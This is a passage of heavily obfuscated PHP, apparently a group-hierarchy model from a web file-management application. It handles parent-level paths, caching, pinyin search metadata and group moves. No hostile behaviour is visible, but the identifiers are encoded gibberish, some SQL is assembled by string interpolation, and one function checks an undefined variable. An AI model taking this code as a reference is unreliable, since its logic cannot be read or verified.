(!empty($Í¥ô×[$ÁÃÖãÔø[180]])) { $‚úË±„¹ = $this->getInfoSimple($Í¥ô×[$ÁÃÖãÔø[180]]); if (!$‚úË±„¹) { return !1; } if ($·†¡ú»ü[$ÁÃÖãÔø[1897]] == $‚úË±„¹[$ÁÃÖãÔø[1897]]) { return !1; } if ($Í¥ô×[$ÁÃÖãÔø[180]] != $·†¡ú»ü[$ÁÃÖãÔø[180]]) { if ($‚úË±„¹[$ÁÃÖãÔø[562]] !== $·†¡ú»ü[$ÁÃÖãÔø[562]] && strpos($‚úË±„¹[$ÁÃÖãÔø[562]], $·†¡ú»ü[$ÁÃÖãÔø[562]] . $·†¡ú»ü[$ÁÃÖãÔø[1897]] . $ÁÃÖãÔø[50]) === 0) { return !1; } $Í¥ô×[$ÁÃÖãÔø[629]] = $‚úË±„¹[$ÁÃÖãÔø[562]] . $Í¥ô×[$ÁÃÖãÔø[180]] . $ÁÃÖãÔø[50]; $this->_changeChildLevel($·†¡ú»ü, $‚úË±„¹); $this->_clearCache($‚úË±„¹[$ÁÃÖãÔø[1897]]); $this->_clearCache($·†¡ú»ü[$ÁÃÖãÔø[180]]); } } if (isset($Í¥ô×[$ÁÃÖãÔø[32]])) { $this->setNamePinyin($ì¢°›ò©, $Í¥ô×[$ÁÃÖãÔø[32]]); } if (isset($Í¥ô×[$ÁÃÖãÔø[1983]])) { $this->metaSet($ì¢°›ò©, array($ÁÃÖãÔø[1983] => $Í¥ô×[$ÁÃÖãÔø[1983]], $ÁÃÖãÔø[1984] => $Í¥ô×[$ÁÃÖãÔø[1984]])); unset($Í¥ô×[$ÁÃÖãÔø[1983]]); unset($Í¥ô×[$ÁÃÖãÔø[1984]]); } $this->_clearChildrenCache($·†¡ú»ü); return $this->where(array($ÁÃÖãÔø[1985] => $ì¢°›ò©))->save($Í¥ô×); } private function _clearChildrenCache($˜•íæş) { $ÅïÁÁš• =& $_SERVER[Ö†ØøÖ±]; $ÍÏçùß = array($ÅïÁÁš•[629] => array($ÅïÁÁš•[589], $˜•íæş[$ÅïÁÁš•[562]] . $˜•íæş[$ÅïÁÁš•[1897]] . $ÅïÁÁš•[590])); $¢È€û±ú = $this->field($ÅïÁÁš•[1897])->where($ÍÏçùß)->select(); foreach ($¢È€û±ú as $ ˜ñ²äÁ) { $this->_clearCache($ ˜ñ²äÁ[$ÅïÁÁš•[1897]]); } } private function _clearCache($¢àüÒÊÜ) { $äŞÍİ•¾ =& $_SERVER[Ö†ØøÖ±]; $this->cacheFunctionClear($äŞÍİ•¾[1979], $¢àüÒÊÜ); $this->cacheFunctionClear($äŞÍİ•¾[1980], $¢àüÒÊÜ); } private function _changeChildLevel($ÄÄ¢µÂ, $Îğ³îÈ, $ïÜøûıæ = false) { $âè¦è‡° =& $_SERVER[Ö†ØøÖ±]; $£šòøíŒ = $ÄÄ¢µÂ[$âè¦è‡°[562]] . $ÄÄ¢µÂ[$âè¦è‡°[1897]] . $âè¦è‡°[50]; $ šÕÍÊ = $Îğ³îÈ[$âè¦è‡°[562]] . $Îğ³îÈ[$âè¦è‡°[1897]] . $âè¦è‡°[50] . $ÄÄ¢µÂ[$âè¦è‡°[1897]] . $âè¦è‡°[50]; if ($ïÜøûıæ) { $ šÕÍÊ = $Îğ³îÈ[$âè¦è‡°[562]] . $Îğ³îÈ[$âè¦è‡°[1897]] . $âè¦è‡°[50]; } $ã¹¾Š‘Ù = array($âè¦è‡°[629] => array($âè¦è‡°[589], $ÄÄ¢µÂ[$âè¦è‡°[562]] . $ÄÄ¢µÂ[$âè¦è‡°[1897]] . $âè¦è‡°[590])); $öë¹„Í = array($âè¦è‡°[629] => array($âè¦è‡°[638], "\x72\145\x70\x6c\x61\143\145\x28\x70\x61\x72\145\156\x74\x4c\x65\166\x65\x6c\54\47{$£šòøíŒ}\x27\x2c\47{$ šÕÍÊ}\x27\x29")); $this->_clearChildrenCache($ÄÄ¢µÂ); $this->where($ã¹¾Š‘Ù)->data($öë¹„Í)->save(); } public function setNamePinyin($À™ş Ò, $Îõ›® = false) { $ü×½áë’ =& $_SERVER[Ö†ØøÖ±]; if (!$Îõ›®) { $Ê“šı¡ = $this->getInfoSimple($À™ş Ò); $Îõ›® = $Ê“šı¡[$ü×½áë’[32]]; } if (!Input::check($Îõ›®, $ü×½áë’[632])) { $this->metaSet($À™ş Ò, $ü×½áë’[515], null); $this->metaSet($À™ş Ò, $ü×½áë’[514], null); return; } $œõ•Äçñ = array($ü×½áë’[515] => str_replace($ü×½áë’[53], $ü×½áë’[12], Pinyin::get($Îõ›®)), $ü×½áë’[514] => Pinyin::get($Îõ›®, $ü×½áë’[633])); $this->metaSet($À™ş Ò, $œõ•Äçñ); } protected function groupStatus($ÂóÉ¿û, $Ãó·â˜Ø) { $ÔßÆğ÷˜ =& $_SERVER[Ö†ØøÖ±]; $öºª×š÷ = $this->getInfoSimple($ÂóÉ¿û); if (!$öºª×š÷) { return !1; } if ($Ãó·â˜Ø == $ÔßÆğ÷˜[88]) { $Ş˜£§Ş = $this->parentLevelArray($öºª×š÷[$ÔßÆğ÷˜[562]]); } else { $ò±Ü­õ¥ = array($ÔßÆğ÷˜[629] => array($ÔßÆğ÷˜[589], $öºª×š÷[$ÔßÆğ÷˜[562]] . $öºª×š÷[$ÔßÆğ÷˜[1897]] . $ÔßÆğ÷˜[590])); $Ş˜£§Ş = $this->where($ò±Ü­õ¥)->field($ÔßÆğ÷˜[1897])->select(); $Ş˜£§Ş = array_to_keyvalue($Ş˜£§Ş, $ÔßÆğ÷˜[12], $ÔßÆğ÷˜[1897]); } $Ş˜£§Ş[] = $öºª×š÷[$ÔßÆğ÷˜[1897]]; $›­²ÊÏ = array(); foreach ($Ş˜£§Ş as $ÂóÉ¿û) { $›­²ÊÏ[] = array($ÔßÆğ÷˜[1897] => $ÂóÉ¿û, $ÔßÆğ÷˜[94] => $ÔßÆğ÷˜[803], $ÔßÆğ÷˜[427] => $Ãó·â˜Ø); $this->_clearCache($ÂóÉ¿û); } return Model($ÔßÆğ÷˜[1986])->addAll($›­²ÊÏ, array(), !0); } protected function groupRemove($†êŞ­ñ, $“ØÜÓí¤ = false) { $ËĞİ÷« =& $_SERVER[Ö†ØøÖ±]; $˜ªÔ²¼ = array($ËĞİ÷«[1897] => $†êŞ­ñ); $ÄÎø™šî = $this->where($˜ªÔ²¼)->find(); if (!$ÄÎø™šî || $ÄÎø™šî[$ËĞİ÷«[180]] == 0) { return !1; } if (!$“ØÜÓí¤) { $Â‰ƒÁ³ğ = $this->getInfoSimple($ÄÎø™šî[$ËĞİ÷«[180]]); $this->_changeChildLevel($ÄÎø™šî, $Â‰ƒÁ³ğ, !0); $this->where(array($ËĞİ÷«[180] => $†êŞ­ñ))->save(array($ËĞİ÷«[180] => $ÄÎø™šî[$ËĞİ÷«[180]])); $this->_clearCache($Â‰ƒÁ³ğ[$ËĞİ÷«[1897]]); } Model($ËĞİ÷«[1986])->where($˜ªÔ²¼)->delete(); Model($ËĞİ÷«[1987])->where($˜ªÔ²¼)->delete(); Model($ËĞİ÷«[878])->groupRootRemove($†êŞ­ñ); $this->_clearCache($ÄÎø™šî[$ËĞİ÷«[180]]); return $this->where($˜ªÔ²¼)->delete(); } protected function groupSort($´ñŠÃÊ²) { $á®‡Í‹‡ =& $_SERVER[Ö†ØøÖ±]; $ªÎÌ¿Ø™ = array(); foreach ($´ñŠÃÊ² as $¸Š¶„“´ => $ªÕ©œ›) { $ªÎÌ¿Ø™[] = array($á®‡Í‹‡[1897], $ªÕ©œ›, $á®‡Í‹‡[1921], $¸Š¶„“´ + 1); } $this->saveAll($ªÎÌ¿Ø™); } public function listData() { $Ö¼£‘¼ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ö¼£‘¼[$_SERVER[Ö†ØøÖ±][422]]); return $Ö¼£‘¼; } private function _makeOrder($ı¯­ÑÓÍ = '') { $ÖãĞ§ğñ =& $_SERVER[Ö†ØøÖ±]; $®÷÷­Û× = array($ÖãĞ§ğñ[1897], $ÖãĞ§ğñ[32], $ÖãĞ§ğñ[1886], $ÖãĞ§ğñ[215]); $Œ—¨ÊŠË = array($ÖãĞ§ğñ[500] => $ÖãĞ§ğñ[501], $ÖãĞ§ğñ[502] => $ÖãĞ§ğñ[503]); $©Ş¦ñİé = Input::get($ÖãĞ§ğñ[507], $ÖãĞ§ğñ[7], $ÖãĞ§ğñ[1901], $®÷÷­Û×); $Ï˜ß‹–À = Input::get($ÖãĞ§ğñ[508], $ÖãĞ§ğñ[7], $ÖãĞ§ğñ[1988], array($ÖãĞ§ğñ[1988], $ÖãĞ§ğñ[502])); $Ï˜ß‹–À = $Œ—¨ÊŠË[$Ï˜ß‹–À]; $ı¯­ÑÓÍ = $ı¯­ÑÓÍ . "{$©Ş¦ñİé}\40{$Ï˜ß‹–À}\54\x20\x67\x72\157\x75\160\x49\x44\40\141\163\x63"; return $this->order($ı¯­ÑÓÍ); } public function listChild($ôï€ï–‡) { $œÆÃ‹Áù =& $_SERVER[Ö†ØøÖ±]; $º½íÑ­š = $this->where(array($œÆÃ‹Áù[180] => $ôï€ï–‡))->_makeOrder()->selectPage(200); $this->_listDataApply($º½íÑ­š[$œÆÃ‹Áù[422]]); return $º½íÑ­š; } public function listChildIds($ûé¹Çø) { $¹·ˆÂÉñ =& $_SERVER[Ö†ØøÖ±]; if (is_string($€êø”İ÷)) { $ûé¹Çø = explode($¹·ˆÂÉñ[50], $ûé¹Çø); } $’ãæ²¯ = $this->where(array($¹·ˆÂÉñ[1897] => array($¹·ˆÂÉñ[7], $ûé¹Çø)))->field($¹·ˆÂÉñ[1989])->select(); if (!$’ãæ²¯) { return !1; } $†´¤Ê•õ = array(); foreach ($’ãæ²¯ as $îàƒ‚¤±) { $†´¤Ê•õ[] = "\x73\145\x6c\145\x63\164\x20\x67\x72\157\x75\160\x49\x44\40\146\162\x6f\x6d\x20\x60\147\x72\157\x75\160\x60\40\167\150\x65\162\145\x20\160\141\162\145\x6e\164\114\145\x76\x65\x6c\40\x6c\151\153\x65\x20\x27{$îàƒ‚¤±[$¹·ˆÂÉñ[562]]}{$îàƒ‚¤±[$¹·ˆÂÉñ[1897]]}\x2c\x25\x27"; } $†´¤Ê•õ = implode($¹·ˆÂÉñ[1990], $†´¤Ê•õ); $’ãæ²¯ = $this->query($†´¤Ê•õ); if (!$’ãæ²¯) { return array(); } $ûé¹Çø = array_to_keyvalue($’ãæ²¯, $¹·ˆÂÉñ[12], $¹·ˆÂÉñ[1897]); return array_unique($ûé¹Çø); } public function listByID($æÇ“ËÈÉ) { $Ö¯ó§ıÜ =& $_SERVER[Ö†ØøÖ±]; if (!$æÇ“ËÈÉ) { return array(); } $ƒğÆå³ = array($Ö¯ó§ıÜ[1897] => array($Ö¯ó§ıÜ[7], $æÇ“ËÈÉ)); $™ø¥Æ·ß = $this->where($ƒğÆå³)->select(); $™ø¥Æ·ß = array_sort_keep($™ø¥Æ·ß, $Ö¯ó§ıÜ[1897], $æÇ“ËÈÉ); $this->_listDataApply($™ø¥Æ·ß); return $™ø¥Æ·ß; } public function listSearch($±å½æë) { $‘ú±¬²š =& $_SERVER[Ö†ØøÖ±]; $›§‡„äç = $±å½æë[$‘ú±¬²š[1991]]; $„¦õëÉª = isset($±å½æë[$‘ú±¬²š[1992]]) ? $±å½æë[$‘ú±¬²š[1992]] : !1; if (!trim($›§‡„äç)) { return !1; } $›§‡„äç = str_replace($‘ú±¬²š[1993], $‘ú±¬²š[1994], $›§‡„äç); $ğã–¯µÏ = array($‘ú±¬²š[1897] => array($‘ú±¬²š[435], "{$›§‡„äç}\x25"), $‘ú±¬²š[32] => array($‘ú±¬²š[435], "\45{$›§‡„äç}\x25"), $‘ú±¬²š[1053] => $‘ú±¬²š[1995]); if ($„¦õëÉª) { $ªéò‹¢ = $this->getInfoSimple($„¦õëÉª); $âËºĞÜ‡ = $ªéò‹¢[$‘ú±¬²š[562]] . $„¦õëÉª . $‘ú±¬²š[590]; $ğã–¯µÏ = array($ğã–¯µÏ, array($‘ú±¬²š[562] => array($‘ú±¬²š[435], $âËºĞÜ‡))); } $ğã–¯µÏ = $this->parseWhereLike($ğã–¯µÏ); $ªò“®ï¦ = $this->_makeOrder()->where($ğã–¯µÏ)->selectPage(20); $ªò“®ï¦ = $ªò“®ï¦ ? $ªò“®ï¦ : array($‘ú±¬²š[422] => array(), $‘ú±¬²š[419] => array()); if (!$ªò“®ï¦ || count($ªò“®ï¦[$‘ú±¬²š[422]]) < 5 && Input::check($›§‡„äç, $‘ú±¬²š[371])) { $šŞòÜöÌ = $this->groupChildrenAll($„¦õëÉª); $æÁâ³¾Ğ = $this->_searchFromMeta($‘ú±¬²š[514], $›§‡„äç, 10, $šŞòÜöÌ); $–‹¦ï = $this->_searchFromMeta($‘ú±¬²š[515], $›§‡„äç, 10, $šŞòÜöÌ); $èÊ†Ü’‘ = array_merge($æÁâ³¾Ğ, $–‹¦ï, $ªò“®ï¦[$‘ú±¬²š[422]]); $ªò“®ï¦[$‘ú±¬²š[422]] = array_unique_by_key($èÊ†Ü’‘, $‘ú±¬²š[1897]); $ªò“®ï¦[$‘ú±¬²š[419]][$‘ú±¬²š[420]] = count($ªò“®ï¦[$‘ú±¬²š[422]]); $ªò“®ï¦[$‘ú±¬²š[419]][$‘ú±¬²š[421]] = ceil($ªò“®ï¦[$‘ú±¬²š[419]][$‘ú±¬²š[420]] / $ªò“®ï¦[$‘ú±¬²š[419]][$‘ú±¬²š[416]]); } $this->_listDataApply($ªò“®ï¦[$‘ú±¬²š[422]]); return $ªò“®ï¦; } protected function groupChildrenAll($Ğ•¼ÂÊ‰) { $•¸ú¶˜ =& $_SERVER[Ö†ØøÖ±]; if (!$Ğ•¼ÂÊ‰) { return !1; } if (!is_array($Ğ•¼ÂÊ‰)) { $Ğ•¼ÂÊ‰ = array($Ğ•¼ÂÊ‰); } $ìµÖƒ ß = $Ğ•¼ÂÊ‰; foreach ($Ğ•¼ÂÊ‰ as $“İÙ¬Ë) { $¼›ÖôÜ¸ = $this->getInfoSimple($“İÙ¬Ë); $ÙÛúÀé = array($•¸ú¶˜[562] => array($•¸ú¶˜[435], $¼›ÖôÜ¸[$•¸ú¶˜[562]] . $“İÙ¬Ë . $•¸ú¶˜[590])); $¹»›ÏŠÃ = $this->field($•¸ú¶˜[1897])->where($ÙÛúÀé)->select(); $ìµÖƒ ß = array_merge($ìµÖƒ ß, array_to_keyvalue($¹»›ÏŠÃ, $•¸ú¶˜[12], $•¸ú¶˜[1897])); } return array_unique($ìµÖƒ ß); } private function _searchFromMeta($×Ø¨ıâù, $ŒØ£ãø›, $ÁÒø‘„â, $´ù§™Ïö) { $¢–ñ¬€® =& $_SERVER[Ö†ØøÖ±]; $ŒØ£ãø› = strtolower($ŒØ£ãø›); $¾·¥™”ø = array($¢–ñ¬€®[94] => $×Ø¨ıâù, $¢–ñ¬€®[427] => array($¢–ñ¬€®[435], "\45{$ŒØ£ãø›}\x25")); $¾·¥™”ø = $this->parseWhereLike($¾·¥™”ø); if ($´ù§™Ïö) { $¾·¥™”ø[$¢–ñ¬€®[1897]] = array($¢–ñ¬€®[7], $´ù§™Ïö); } $ÈŒ‰ö÷Ô = Model($¢–ñ¬€®[1996])->where($¾·¥™”ø)->limit($ÁÒø‘„â)->select(); if (!$ÈŒ‰ö÷Ô) { return array(); } $ÈŒ‰ö÷Ô = array_to_keyvalue($ÈŒ‰ö÷Ô, $¢–ñ¬€®[12], $¢–ñ¬€®[1897]); $í´·¶„‚ = $this->where(array($¢–ñ¬€®[1985] => array($¢–ñ¬€®[7], $ÈŒ‰ö÷Ô)))->select(); if (!$í´·¶„‚) { return array(); } return $í´·¶„‚; } protected function _listDataApplyItem($Ü²é¿¨ô) { $Å«Ş†Ì = array($Ü²é¿¨ô); $this->_listDataApply($Å«Ş†Ì); return $Å«Ş†Ì[0]; } protected function _listDataApply(&$’ˆ¢¡Áµ) { $¼Ü²“Ğ± =& $_SERVER[Ö†ØøÖ±]; if (!$’ˆ¢¡Áµ) { return; } $ÁÕØÙ‹ = array_to_keyvalue($’ˆ¢¡Áµ, $¼Ü²“Ğ±[12], $¼Ü²“Ğ±[1897]); $this->_listAppendChildren($’ˆ¢¡Áµ); $this->_listAppendChildrenMember($’ˆ¢¡Áµ); $this->_listAppendMeta($’ˆ¢¡Áµ, $ÁÕØÙ‹); $this->_listAppendParent($’ˆ¢¡Áµ); $this->_listAppendSourceRoot($’ˆ¢¡Áµ, $ÁÕØÙ‹); } private function _listAppendChildren(&$©¡Æô²¥) { $éÂàÔ®É =& $_SERVER[Ö†ØøÖ±]; $‚Œ†„á˜ = array_to_keyvalue($©¡Æô²¥, $éÂàÔ®É[12], $éÂàÔ®É[1897]); $ÚñÒŞ»œ = array($éÂàÔ®É[180] => array($éÂàÔ®É[7], $‚Œ†„á˜)); $î€‘ıÜ = array($éÂàÔ®É[180], $éÂàÔ®É[1997] => $éÂàÔ®É[542]); $¦õ€”Ï = $this->field($î€‘ıÜ)->where($ÚñÒŞ»œ)->group($éÂàÔ®É[180])->select(); $´®¼´Ÿ = array_to_keyvalue($¦õ€”Ï, $éÂàÔ®É[180], $éÂàÔ®É[542]); foreach ($©¡Æô²¥ as &$íÔÍì¨‚) { $Ğåªœø = $íÔÍì¨‚[$éÂàÔ®É[1897]]; $íÔÍì¨‚[$éÂàÔ®É[1998]] = isset($´®¼´Ÿ[$Ğåªœø]) ? intval($´®¼´Ÿ[$Ğåªœø]) : !1; } unset($íÔÍì¨‚); } private function _listAppendChildrenMember(&$“ì®èâò) { $ŠÙÒÑæÙ =& $_SERVER[Ö†ØøÖ±]; $Çôú¨…ª = array_to_keyvalue($“ì®èâò, $ŠÙÒÑæÙ[12], $ŠÙÒÑæÙ[1897]); $¹“×ƒÙÏ = array($ŠÙÒÑæÙ[1897] => array($ŠÙÒÑæÙ[7], $Çôú¨…ª)); $ñ âˆ†Ë = array($ŠÙÒÑæÙ[1897], $ŠÙÒÑæÙ[1997] => $ŠÙÒÑæÙ[542]); $ÁÖÄÓö = Model($ŠÙÒÑæÙ[1987])->field($ñ âˆ†Ë)->where($¹“×ƒÙÏ)->group($ŠÙÒÑæÙ[1897])->select(); $û½í×çÀ = array_to_keyvalue($ÁÖÄÓö, $ŠÙÒÑæÙ[1897], $ŠÙÒÑæÙ[542]); foreach ($“ì®èâò as &$˜”ò´³) { $”­…òÁù = $˜”ò´³[$ŠÙÒÑæÙ[1897]]; $˜”ò´³[$ŠÙÒÑæÙ[1999]] = isset($û½í×çÀ[$”­…òÁù]) ? intval($û½í×çÀ[$”­…òÁù]) : !1; } unset($˜”ò´³); } private function _listAppendMeta(&$–Æ©óà®, $•ÒÓîÄç) { $•³îÜÎ =& $_SERVER[Ö†ØøÖ±]; $ÔˆÎğÂÈ = array($•³îÜÎ[1897] => array($•³îÜÎ[7], $•ÒÓîÄç)); $½é‹¹¡Ç = Model($•³îÜÎ[1986])->where($ÔˆÎğÂÈ)->select(); $½é‹¹¡Ç = array_to_keyvalue_group($½é‹¹¡Ç, $•³îÜÎ[1897]); foreach ($½é‹¹¡Ç as &$¦î²úÓŒ) { $¦î²úÓŒ = array_to_keyvalue($¦î²úÓŒ, $•³îÜÎ[94], $•³îÜÎ[427]); } unset($¦î²úÓŒ); foreach ($–Æ©óà® as &$ƒŞ¦Ë³) { $ƒŞ¦Ë³[$•³îÜÎ[516]] = array(); if (isset($½é‹¹¡Ç[$ƒŞ¦Ë³[$•³îÜÎ[1897]]])) { $ƒŞ¦Ë³[$•³îÜÎ[516]] = $½é‹¹¡Ç[$ƒŞ¦Ë³[$•³îÜÎ[1897]]]; } } unset($ƒŞ¦Ë³); } protected function parentLevelArray($é´Î´Î) { $£ïÔãĞ =& $_SERVER[Ö†ØøÖ±]; $é´Î´Î = explode($£ïÔãĞ[50], trim($é´Î´Î, $£ïÔãĞ[50])); $é´Î´Î = array_remove_value($é´Î´Î, $£ïÔãĞ[212]); return $é´Î´Î; } protected function parentInGroup($ã”Ãƒ¥©, $¼¥¿ãç) { $†Êêå€ü =& $_SERVER[Ö†ØøÖ±]; $å÷àó· = $this->getInfoSimple($ã”Ãƒ¥©); if (!$å÷àó·) { return !0; } $†ì®‚ä = $this->parentLevelArray($å÷àó·[$†Êêå€ü[562]]); $†ì®‚ä[] = $ã”Ãƒ¥©; foreach ($†ì®‚ä as $ã”Ãƒ¥©) { if (in_array($ã”Ãƒ¥© . $†Êêå€ü[12], $¼¥¿ãç)) { return !0; } } return !1; } private function _listAppendParent(&$Á¯ş—¡Ÿ) { $Æñ–ºœ =& $_SERVER[Ö†ØøÖ±]; $ŠÑ°—öÆ = array(); foreach ($Á¯ş—¡Ÿ as &$îŞÊ™ƒÆ) { $ŠÑ°—öÆ[$îŞÊ™ƒÆ[$Æñ–ºœ[1897]]] = $îŞÊ™ƒÆ[$Æñ–ºœ[32]]; $ø½Â÷ŒÇ = $this->parentLevelArray($îŞÊ™ƒÆ[$Æñ–ºœ[562]]); foreach ($ø½Â÷ŒÇ as $Ì©Ÿ¡Æò) { if (!isset($ŠÑ°—öÆ[$Ì©Ÿ¡Æò])) { $ŠÑ°—öÆ[$Ì©Ÿ¡Æò] = 0; } } } unset($îŞÊ™ƒÆ); foreach ($ŠÑ°—öÆ as $·‰ÙôŞò => $Ç€»ŞÃù) { if ($Ç€»ŞÃù) { continue; } $ì½´×­æ = $this->getInfoSimple($·‰ÙôŞò); $ŠÑ°—öÆ[$·‰ÙôŞò] = $ì½´×­æ[$Æñ–ºœ[32]]; } $Óİ§Úôµ = $GLOBALS[$Æñ–ºœ[6]][$Æñ–ºœ[89]][$Æñ–ºœ[2000]]; if ($GLOBALS[$Æñ–ºœ[545]] == $Æñ–ºœ[88]) { $Óİ§Úôµ = !1; } foreach ($Á¯ş—¡Ÿ as &$îŞÊ™ƒÆ) { $ø½Â÷ŒÇ = $this->parentLevelArray($îŞÊ™ƒÆ[$Æñ–ºœ[562]]); $Ÿ«û²¦‡ = $Æñ–ºœ[12]; foreach ($ø½Â÷ŒÇ as $·‰ÙôŞò => $Ì©Ÿ¡Æò) { if ($Óİ§Úôµ && $·‰ÙôŞò == 0) { continue; } $Ÿ«û²¦‡ .= $ŠÑ°—öÆ[$Ì©Ÿ¡Æò] . $Æñ–ºœ[8]; } if ($ø½Â÷ŒÇ) { $Ÿ«û²¦‡ .= $îŞÊ™ƒÆ[$Æñ–ºœ[32]]; } $îŞÊ™ƒÆ[$Æñ–ºœ[567]] = str_replace($Æñ–ºœ[570], $Æñ–ºœ[8], $Ÿ«û²¦‡); } unset($îŞÊ™ƒÆ); } private function _listAppendSourceRoot(&$ÁĞ­âß’, $÷¼¸ÊÚ÷) { $Úõ÷«€‡ =& $_SERVER[Ö†ØøÖ±]; $£¦¢å˜„ = Model($Úõ÷«€‡[878])->listSourceRoot(SourceModel::TYPE_GROUP, $÷¼¸ÊÚ÷); $£¦¢å˜„ = array_to_keyvalue($£¦¢å˜„, $Úõ÷«€‡[547]); $£¦¢å˜„ = array_remove_key($£¦¢å˜„, $Úõ÷«€‡[547]); foreach ($ÁĞ­âß’ as &$Æğëºóô) { $Æğëºóô[$Úõ÷«€‡[87]] = $£¦¢å˜„[$Æğëºóô[$Úõ÷«€‡[1897]]] ? $£¦¢å˜„[$Æğëºóô[$Úõ÷«€‡[1897]]] : array(); } unset($Æğëºóô); } protected function groupMerge($ó£‹ŸÙ–) { $ó£‹ŸÙ– = array_values(array_unique($ó£‹ŸÙ–)); $Ñ¨¼ûÙ¨ = array(); for ($ÙÈ“İ = 0; $ÙÈ“İ < count($ó£‹ŸÙ–); $ÙÈ“İ++) { $ƒøº²¸ = !1; for ($òÂ¬ö = 0; $òÂ¬ö < count($ó£‹ŸÙ–); $òÂ¬ö++) { if ($ÙÈ“İ == $òÂ¬ö) { continue; } if ($this->isParentOf($ó£‹ŸÙ–[$òÂ¬ö], $ó£‹ŸÙ–[$ÙÈ“İ])) { $ƒøº²¸ = !0; break; } } if (!$ƒøº²¸) { $Ñ¨¼ûÙ¨[] = $ó£‹ŸÙ–[$ÙÈ“İ]; } } return $Ñ¨¼ûÙ¨; } protected function isParentOf($‡çñç˜¤, $Û¶ÌİÈì) { $–à×é´÷ =& $_SERVER[Ö†ØøÖ±]; if (!$‡çñç˜¤ || !$Û¶ÌİÈì || $‡çñç˜¤ == $Û¶ÌİÈì) { return !1; } $æÍ„¿ = $this->getInfoSimple($‡çñç˜¤); $•Ø‡–éÆ = $this->getInfoSimple($Û¶ÌİÈì); $îèÕÎËà = $æÍ„¿[$–à×é´÷[562]] . $‡çñç˜¤ . $–à×é´÷[50]; if (substr($•Ø‡–éÆ[$–à×é´÷[562]], 0, strlen($îèÕÎËà)) == $îèÕÎËà) { return !0; } return !1; } public function groupShowRoot($ƒª®‚¤, $¼ó½æâÆ = false) { $µÜŒ¡Ç÷ =& $_SERVER[Ö†ØøÖ±]; $«Ÿ»Øú¿ = $this->getInfo($ƒª®‚¤); if (!$«Ÿ»Øú¿) { return array(); } $ƒĞÕç‚ç = $this->parentLevelArray($«Ÿ»Øú¿[$µÜŒ¡Ç÷[562]]); $Ê‰úŠÛ× = array($ƒª®‚¤); if (count($ƒĞÕç‚ç) == 0) { return $Ê‰úŠÛ×; } if ($¼ó½æâÆ && count($ƒĞÕç‚ç) == 1) { return $Ê‰úŠÛ×; } if (!$«Ÿ»Øú¿[$µÜŒ¡Ç÷[516]] || !isset($«Ÿ»Øú¿[$µÜŒ¡Ç÷[516]][$µÜŒ¡Ç÷[1983]]) || $«Ÿ»Øú¿[$µÜŒ¡Ç÷[516]][$µÜŒ¡Ç÷[1983]] == $µÜŒ¡Ç÷[1952]) { return $this->groupShowRoot($ƒĞÕç‚ç[count($ƒĞÕç‚ç) - 1], $¼ó½æâÆ); } if ($«Ÿ»Øú¿[$µÜŒ¡Ç÷[516]][$µÜŒ¡Ç÷[1983]] == $µÜŒ¡Ç÷[410]) { $èÜáæèÄ = explode($µÜŒ¡Ç÷[50], $«Ÿ»Øú¿[$µÜŒ¡Ç÷[516]][$µÜŒ¡Ç÷[1984]]); if ($èÜáæèÄ) { $Ê‰úŠÛ× = array_merge($Ê‰úŠÛ×, $èÜáæèÄ); } } return $Ê‰úŠÛ×; } protected function resetParentLevel() { $ ë †  =& $_SERVER[Ö†ØøÖ±]; $³Š½€Œ½ = $ ë † [1897]; $Í¬Éè” = $this->select(); $Í¬Éè” = array_to_keyvalue($Í¬Éè”, $³Š½€Œ½); foreach ($Í¬Éè” as $ûØÑÒØ‚) { $Ï†ğ¯ÊÙ = $ûØÑÒØ‚; $›ë”Îß = array(); while ($Ï†ğ¯ÊÙ[$ ë † [180]] != 0) { $›ë”Îß[] = $Ï†ğ¯ÊÙ[$ ë † [180]]; $Ï†ğ¯ÊÙ = $Í¬Éè”[$Ï†ğ¯ÊÙ[$ ë † [180]]]; } $›ë”Îß[] = 0; $›ë”Îß = $ ë † [50] . implode($ ë † [50], array_reverse($›ë”Îß)) . $ ë † [50]; $this->setNamePinyin($ûØÑÒØ‚[$³Š½€Œ½], $ûØÑÒØ‚[$ ë † [32]]); $this->where(array($³Š½€Œ½ => $ûØÑÒØ‚[$³Š½€Œ½]))->save(array($ ë † [629] => $›ë”Îß)); } return $Í¬Éè”; } public function groupNameAuto($‹õÒè¬, $×èöŞß¼) { $‡Æ‡“ğş =& $_SERVER[Ö†ØøÖ±]; $‡ıûŸÅÎ = $this->where(array($‡Æ‡“ğş[454] => $‹õÒè¬))->getField($‡Æ‡“ğş[32], !0); if (!$‡ıûŸÅÎ || !in_array($×èöŞß¼, $‡ıûŸÅÎ)) { return $×èöŞß¼; } for ($“õôÉ = 1; $“õôÉ <= count($‡ıûŸÅÎ) + 1; $“õôÉ++) { $íÉÑŠŞ× = $×èöŞß¼ . "\x28{$“õôÉ}\51"; if (!in_array($íÉÑŠŞ×, $‡ıûŸÅÎ)) { return $íÉÑŠŞ×; } } } public function groupSwitch($¬Ï›¢Ñ, $’Ë”·İÕ) { $ÃÜçš÷” =& $_SERVER[Ö†ØøÖ±]; $ÏĞ¤¾¾¹ = array($ÃÜçš÷”[1897] => array($ÃÜçš÷”[7], array($¬Ï›¢Ñ, $’Ë”·İÕ))); $š¿©¥Ë = $this->where($ÏĞ¤¾¾¹)->select(); $š¿©¥Ë = array_to_keyvalue($š¿©¥Ë, $ÃÜçš÷”[1897]); if (!isset($š¿©¥Ë[$¬Ï›¢Ñ]) || !isset($š¿©¥Ë[$’Ë”·İÕ]) || $š¿©¥Ë[$¬Ï›¢Ñ][$ÃÜçš÷”[180]] == 0) { return !1; } $ÏĞ¤¾¾¹ = array($ÃÜçš÷”[1897] => $¬Ï›¢Ñ); $¬íãÃ×Ğ = Model($ÃÜçš÷”[1987])->where($ÏĞ¤¾¾¹)->select(); if (!$¬íãÃ×Ğ) { $¬íãÃ×Ğ = array(); } foreach ($¬íãÃ×Ğ as $“¥Â­‰Ï) { $™ë…Åøç = $“¥Â­‰Ï[$ÃÜçš÷”[1699]]; $ÏĞ¤¾¾¹ = array($ÃÜçš÷”[1699] => $™ë…Åøç, $ÃÜçš÷”[1897] => $’Ë”·İÕ); $ı¡ñÆó = Model($ÃÜçš÷”[1987])->where($ÏĞ¤¾¾¹)->find(); if (!$ı¡ñÆó) { $Ê¼ËÌÇ  = array($’Ë”·İÕ => $“¥Â­‰Ï[$ÃÜçš÷”[2001]]); Model($ÃÜçš÷”[576])->userGroupAdd($™ë…Åøç, $Ê¼ËÌÇ ); } Model($ÃÜçš÷”[576])->userGroupRemove($™ë…Åøç, $¬Ï›¢Ñ); } $ÏĞ¤¾¾¹ = array($ÃÜçš÷”[178] => 2, 